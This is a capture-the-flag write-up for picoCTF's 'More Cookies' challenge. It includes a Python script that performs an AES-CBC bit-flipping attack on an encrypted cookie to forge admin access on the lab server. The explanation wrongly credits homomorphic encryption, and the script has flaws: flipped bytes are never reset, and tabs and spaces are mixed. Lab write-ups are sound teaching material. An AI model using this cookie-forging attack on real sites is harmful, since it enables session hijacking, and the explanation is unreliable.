---
description: 'Author: madStacks'
---

## Problem Description

I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! [http://mercury.picoctf.net:10868/](http://mercury.picoctf.net:10868/)

# Solution

![](/assets_md/Pasted%20image%2020220527163955.png)

![](assets_md/Pasted%20image%2020220527172003.png)


**Decoding Base64**

```bash
[Ishikawa WebExploitation] $ echo 'SXNGUEd3SFhpZFFKTDJBME5IZ3BsaW1RV0FjQm93eVB6ZmZrbS9yaVVtdnNkYzNtNkQrY3cwbE1tSWE4QzgvR2ZEdVNKaHRlWXhEZWNKS2E2OUEvSkV0VkNOZE9iQUxjcjRuV0JTNzE4QWQ3VjVaNlk0NFp1SHB2dnhHTVJYaVU=' | base64 -d
IsFPGwHXidQJL2A0NHgplimQWAcBowyPzffkm/riUmvsdc3m6D+cw0lMmIa8C8/GfDuSJhteYxDecJKa69A/JEtVCNdObALcr4nWBS718Ad7V5Z6Y44ZuHpvvxGMRXiU                 
```

**Using Homomorphic Encryption**

Homomorphic encryption is a new type of encryption which allows to perform computation without decrypting data.

### [CBC Bit-Flip Attack](https://zhangzeyu2001.medium.com/attacking-cbc-mode-bit-flipping-7e0a1c185511)

Example : [AES-CBC bit flipping Attack by dr3dd](https://dr3dd.gitlab.io/cryptography/2019/01/10/simple-AES-CBC-bit-flipping-attack/)

**Exploit Code**

```python
import requests
from base64 import b64encode, b64decode
from tqdm import tqdm
from queue import Queue

cookie_str = 'VHR0WUVlRk0wLzhUR00xTC8yS2FsSEU1MU5OaGUrM3lEaWxxVXo4TktjTmN6cVlYSy9QbjJVS0dLR2tUbVdOS1lCU3E2TU1BbGxPMnk2aXhSeUtuRWQ4VE52WDh1VjNscmYvZ3FpQ2dEWFZmd1UrdmpMRUtQWjhBQlZPUkdrWFk='
url = 'http://mercury.picoctf.net:10868/'

# cookie in encoded 2 times 
b64_cookie = b64decode(cookie_str).decode()
raw_cookie = bytearray(b64decode(b64_cookie))

flip_set = Queue()

def fetch_query(position, bit):

    raw_cookie[position] = raw_cookie[position]^bit
    forge_b64 = b64encode(b64encode(bytes(raw_cookie))).decode()

    req = requests.get(url, cookies={'auth_name': forge_b64})

    if 'picoCTF{' in req.content.decode():
        print(f"Cookie found @ {position}:{bit} : ", end='')
        print(req.text.split('code>')[1].split('</')[0])
        global flip_set

        while not flip_set.empty():
            flip_set.get_nowait()


def main():

    # fliping up to 16 positions 
    for i in range(16):
        # fliping upto 128 bits XOR with up to 128 values in ASCII Table
        for j in range(128):
            flip_set.put((i,j))


    for _ in tqdm(range(flip_set.qsize()), desc="Attack Progress :"):
		if not flip_set.empty():
			pos, bit =  flip_set.get_nowait()
			fetch_query(pos, bit)
			flip_set.task_done()

main()
```

![](assets_md/Pasted%20image%2020220529102107.png)
